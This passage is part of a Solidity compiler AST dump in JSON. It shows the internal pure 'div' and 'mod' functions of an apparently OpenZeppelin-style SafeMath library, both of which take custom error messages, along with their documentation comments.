														"src": "5875:12:2"
													}
												]
											}
										]
									},
									"documentation": {
										"id": 414,
										"nodeType": "StructuredDocumentation",
										"src": "5196:473:2",
										"text": " @dev Returns the integer division of two unsigned integers, reverting with custom message on\n division by zero. The result is rounded towards zero.\n Counterpart to Solidity's `/` operator. Note: this function uses a\n `revert` opcode (which leaves remaining gas untouched) while Solidity\n uses an invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 438,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "div",
									"nameLocation": "5683:3:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 421,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 416,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "5704:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 438,
												"src": "5696:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 415,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5696:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 418,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "5723:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 438,
												"src": "5715:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 417,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5715:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 420,
												"mutability": "mutable",
												"name": "errorMessage",
												"nameLocation": "5748:12:2",
												"nodeType": "VariableDeclaration",
												"scope": 438,
												"src": "5734:26:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 419,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "5734:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "5686:80:2"
									},
									"returnParameters": {
										"id": 424,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 423,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 438,
												"src": "5790:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 422,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5790:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "5789:9:2"
									},
									"scope": 464,
									"src": "5674:230:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 462,
										"nodeType": "Block",
										"src": "6675:105:2",
										"statements": [
											{
												"id": 461,
												"nodeType": "UncheckedBlock",
												"src": "6685:89:2",
												"statements": [
													{
														"expression": {
															"arguments": [
																{
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 453,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"id": 451,
																		"name": "b",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 443,
																		"src": "6717:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": ">",
																	"rightExpression": {
																		"hexValue": "30",
																		"id": 452,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "6721:1:2",
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_0_by_1",
																			"typeString": "int_const 0"
																		},
																		"value": "0"
																	},
																	"src": "6717:5:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	}
																},
																{
																	"id": 454,
																	"name": "errorMessage",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 445,
																	"src": "6724:12:2",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_bool",
																		"typeString": "bool"
																	},
																	{
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string memory"
																	}
																],
																"id": 450,
																"name": "require",
																"nodeType": "Identifier",
																"overloadedDeclarations": [
																	4294967278,
																	4294967278
																],
																"referencedDeclaration": 4294967278,
																"src": "6709:7:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
																	"typeString": "function (bool,string memory) pure"
																}
															},
															"id": 455,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "6709:28:2",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_tuple$__$",
																"typeString": "tuple()"
															}
														},
														"id": 456,
														"nodeType": "ExpressionStatement",
														"src": "6709:28:2"
													},
													{
														"expression": {
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 459,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"id": 457,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 441,
																"src": "6758:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "%",
															"rightExpression": {
																"id": 458,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 443,
																"src": "6762:1:2",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "6758:5:2",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"functionReturnParameters": 449,
														"id": 460,
														"nodeType": "Return",
														"src": "6751:12:2"
													}
												]
											}
										]
									},
									"documentation": {
										"id": 439,
										"nodeType": "StructuredDocumentation",
										"src": "5910:635:2",
										"text": " @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n reverting with custom message when dividing by zero.\n CAUTION: This function is deprecated because it requires allocating memory for the error\n message unnecessarily. For custom revert reasons use {tryMod}.\n Counterpart to Solidity's `%` operator. This function uses a `revert`\n opcode (which leaves remaining gas untouched) while Solidity uses an\n invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 463,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mod",
									"nameLocation": "6559:3:2",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 446,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 441,
												"mutability": "mutable",
												"name": "a",
												"nameLocation": "6580:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 463,
												"src": "6572:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 440,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "6572:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 443,
												"mutability": "mutable",
												"name": "b",
												"nameLocation": "6599:1:2",
												"nodeType": "VariableDeclaration",
												"scope": 463,
												"src": "6591:9:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 442,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "6591:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 445,
												"mutability": "mutable",
												"name": "errorMessage",
												"nameLocation": "6624:12:2",
												"nodeType": "VariableDeclaration",
												"scope": 463,
												"src": "6610:26:2",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 444,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "6610:6:2",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "6562:80:2"
									},
									"returnParameters": {
										"id": 449,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 448,
												"mutability": "mutable",
												"name": "",
												"nameLocation": "-1:-1:-1",
												"nodeType": "VariableDeclaration",
												"scope": 463,
												"src": "6666:7:2",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 447,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "6666:7:2",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"visibility": "internal"
											}
										],
										"src": "6665:9:2"
									},
									"scope": 464,
									"src": "6550:230:2",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								}
							],
							"scope": 465,
							"src": "482:6300:2",
							"usedErrors": []
						}
					],
					"src": "107:6676:2"
				},
				"id": 2
			}
		}
	}
}